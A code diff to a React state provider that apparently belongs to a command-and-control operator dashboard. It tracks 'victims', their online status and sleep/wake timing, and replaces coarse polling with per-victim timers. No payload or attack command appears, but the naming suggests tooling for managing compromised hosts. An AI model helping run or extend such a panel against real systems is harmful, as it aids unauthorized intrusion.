@@ -36,8 +36,11 @@ export function AppProvider({ children }) {
   const [polling, setPolling]           = useState(false);
   const pollTimerRef  = useRef(null);
   const pollCountRef  = useRef(0);
+  const sleepWakeTimersRef = useRef({});
   const activeVictimRef = useRef(activeVictim);
+  const victimsRef = useRef(victims);
   useEffect(() => { activeVictimRef.current = activeVictim; }, [activeVictim]);
+  useEffect(() => { victimsRef.current = victims; }, [victims]);
 
   // ── Load config from options.yml ──────────────────────────────────────────
   const fetchConfig = useCallback(async () => {
@@ -83,34 +86,31 @@ export function AppProvider({ children }) {
       setRows(fetched);
       setLastRefresh(new Date());
       setVictimOnline(victim.id, true);
-      if (sleepStatus[victim.id]) {
-        const sleepEntry = sleepStatus[victim.id];
-        if (new Date(sleepEntry.wakeAt) <= new Date() && sleepEntry.state !== 'ready') {
-          setSleepStatus((prev) => ({
-            ...prev,
-            [victim.id]: {
-              ...prev[victim.id],
-              state: 'ready',
-            },
-          }));
-        }
-      }
+      setSleepStatus((prev) => {
+        const sleepEntry = prev[victim.id];
+        if (!sleepEntry || sleepEntry.state === 'ready') return prev;
+        if (new Date(sleepEntry.wakeAt) > new Date()) return prev;
+        return {
+          ...prev,
+          [victim.id]: { ...sleepEntry, state: 'ready' },
+        };
+      });
       return fetched;
     } catch (e) {
       setError(e.response?.data?.error || e.message);
-      if (victim?.id && sleepStatus[victim.id] && new Date(sleepStatus[victim.id].wakeAt) <= new Date()) {
-        setSleepStatus((prev) => ({
+      setSleepStatus((prev) => {
+        const sleepEntry = victim?.id ? prev[victim.id] : null;
+        if (!sleepEntry || sleepEntry.state === 'waiting') return prev;
+        if (new Date(sleepEntry.wakeAt) > new Date()) return prev;
+        return {
           ...prev,
-          [victim.id]: {
-            ...prev[victim.id],
-            state: 'waiting',
-          },
-        }));
-      }
+          [victim.id]: { ...sleepEntry, state: 'waiting' },
+        };
+      });
       setVictimOnline(victim?.id, false);
       return null;
     }
-  }, [isConfigured, sleepStatus, setVictimOnline]);
+  }, [isConfigured, setVictimOnline]);
 
   const fetchRowsForVictim = useCallback(async (victim) => {
     if (!victim || !isConfigured) return null;
@@ -318,6 +318,67 @@ export function AppProvider({ children }) {
     }
   }, [isConfigured]);
 
+  // When wakeAt elapses, verify the sheet and flip sleeping → ready | waiting
+  const resolveSleepWake = useCallback(async (victimId) => {
+    const victim = victimsRef.current.find((v) => String(v.id) === String(victimId));
+    if (!victim || !isConfigured) return;
+
+    const rowsForVictim = await fetchRowsForVictim(victim);
+    if (rowsForVictim) {
+      setSleepStatus((prev) => {
+        const entry = prev[victimId];
+        if (!entry || entry.state === 'ready') return prev;
+        return { ...prev, [victimId]: { ...entry, state: 'ready' } };
+      });
+      setVictimOnline(victimId, true);
+      if (activeVictimRef.current?.id === victimId) {
+        setRows(rowsForVictim);
+        setLastRefresh(new Date());
+      }
+    } else {
+      setSleepStatus((prev) => {
+        const entry = prev[victimId];
+        if (!entry || entry.state === 'waiting') return prev;
+        return { ...prev, [victimId]: { ...entry, state: 'waiting' } };
+      });
+      setVictimOnline(victimId, false);
+    }
+  }, [isConfigured, fetchRowsForVictim, setVictimOnline]);
+
+  // Schedule one timer per victim at wakeAt (replaces coarse 10s polling)
+  useEffect(() => {
+    const timers = sleepWakeTimersRef.current;
+
+    for (const victimId of Object.keys(timers)) {
+      const entry = sleepStatus[victimId];
+      if (!entry || entry.state !== 'sleeping') {
+        clearTimeout(timers[victimId]);
+        delete timers[victimId];
+      }
+    }
+
+    for (const [victimId, entry] of Object.entries(sleepStatus)) {
+      if (!entry || entry.state !== 'sleeping') continue;
+
+      const ms = new Date(entry.wakeAt).getTime() - Date.now();
+      if (ms <= 0) {
+        resolveSleepWake(victimId);
+        continue;
+      }
+
+      if (timers[victimId]) clearTimeout(timers[victimId]);
+      timers[victimId] = setTimeout(() => {
+        delete timers[victimId];
+        resolveSleepWake(victimId);
+      }, ms);
+    }
+  }, [sleepStatus, resolveSleepWake]);
+
+  useEffect(() => () => {
+    Object.values(sleepWakeTimersRef.current).forEach(clearTimeout);
+    sleepWakeTimersRef.current = {};
+  }, []);
+
   // ── Effects ───────────────────────────────────────────────────────────────
   useEffect(() => { if (isConfigured) fetchVictims(); }, [isConfigured]);
 
@@ -327,46 +388,6 @@ export function AppProvider({ children }) {
       fetchRows(activeVictim);
     }
   }, [activeVictim?.id]);
-
-  useEffect(() => {
-    const interval = setInterval(async () => {
-      if (!isConfigured) return;
-      const now = new Date();
-      const entries = Object.entries(sleepStatus);
-      if (entries.length === 0) return;
-
-      for (const [victimId, entry] of entries) {
-        if (!entry || entry.state === 'ready') continue;
-        const wakeAt = new Date(entry.wakeAt);
-        if (wakeAt > now) continue;
-
-        const victim = victims.find((v) => v.id === victimId);
-        if (!victim) continue;
-
-        const rowsForVictim = await fetchRowsForVictim(victim);
-        if (rowsForVictim) {
-          setSleepStatus((prev) => ({
-            ...prev,
-            [victimId]: {
-              ...prev[victimId],
-              state: 'ready',
-            },
-          }));
-          setVictimOnline(victimId, true);
-        } else {
-          setSleepStatus((prev) => ({
-            ...prev,
-            [victimId]: {
-              ...prev[victimId],
-              state: 'waiting',
-            },
-          }));
-          setVictimOnline(victimId, false);
-        }
-      }
-    }, 10000);
-    return () => clearInterval(interval);
-  }, [isConfigured, sleepStatus, victims, fetchRowsForVictim, setVictimOnline]);
 
   // Auto-refresh (manual toggle)
   useEffect(() => {
